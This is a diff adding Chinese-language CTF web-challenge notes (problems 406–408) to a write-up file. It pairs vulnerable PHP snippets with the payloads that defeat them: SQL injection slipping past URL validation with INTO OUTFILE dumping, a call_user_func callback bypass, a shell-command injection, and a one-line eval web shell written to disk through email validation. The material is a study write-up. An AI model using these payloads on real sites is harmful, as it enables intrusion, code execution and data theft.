@@ -1,5 +1,6 @@
 ﻿---
 title: "搭建服务器"
+lastmod: 2026-06-02T22:23:31+08:00
 draft: false
 ---
 ```bash
@@ -3194,3 +3195,74 @@ if(isset($_GET['url'])){    $url = parse_url($_GET['url']);
 那么可以把注入的东西写在host里面
 注意一下shell语句记得用;闭合就行
 `?url=php://127.0.0.1;cp fl0g.php 1.txt;/1`
+## 406
+```php
+<?php  
+require 'config.php';  
+//flag in db  
+highlight_file(__FILE__);  
+$url=$_GET['url'];  
+if(filter_var ($url,FILTER_VALIDATE_URL)){    $sql = "select * from links where url ='{$url}'";    $result = $conn->query($sql);  
+}else{  
+    echo '不通过';  
+}
+```
+通过构造一个url可以绕过
+`?url=http://yuanshen/'or'1'='1`
+通过这个可以逃逸
+但是问题是没有回显
+所以我们可以直接使用outfile输出到文件中
+注意一下这个link里面可能一个值也没有，需要union联合注入，而union注入要求是行数相同
+需要写一个concat来对于结果进行合并
+```
+?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/into/**/outfile/**/'/var/www/html/3.txt#
+```
+先测试出来输出的结果是几行
+这个里面最后会合并一个'，注意一下不能把#写进字符串去，可能不会解析
+```
+可以爆库名也可以不爆因为一般都是在当前数据库，所以我就没有爆
+爆表名
+?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/into/**/outfile/**/'/var/www/html/3.txt#
+爆列名
+?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'/**/into/**/outfile/**/'/var/www/html/9.txt#
+爆flag
+?url=http://127.0.0.1/1.php'union/**/select/**/1,group_concat(flag)/**/from/**/flag/**/into/**/outfile/**/'/var/www/html/6.txt#
+```
+最终利用的方案
+## 407
+```php
+<?php   
+highlight_file(__FILE__);  
+error_reporting(0);  
+$ip=$_GET['ip'];  
+  
+if(filter_var ($ip,FILTER_VALIDATE_IP)){    call_user_func($ip);  
+}  
+  
+class cafe{  
+    public static function add(){  
+        echo file_get_contents('flag.php');  
+    }  
+}
+```
+直接cafe::add就能绕过
+这个是回调字符串格式，能调用类的方法
+## 408
+```php
+<?php  
+highlight_file(__FILE__);  
+error_reporting(0);  
+$email=$_GET['email'];  
+  
+if(filter_var ($email,FILTER_VALIDATE_EMAIL)){    file_put_contents(explode('@', $email)[1], explode('@', $email)[0]);  
+}
+```
+explode('@', $email)
+用@将参数分开并且将，@之前的写入，@之后的文件
+filter_var ($email,FILTER_VALIDATE_EMAIL)
+检查是否为正常的IP，这里我们可以使用双引号绕过
+GET：
+而且有空格格式就不对所以小马得这么写
+`?email="<?=eval($_POST[1])?>"@1.php`
+
+
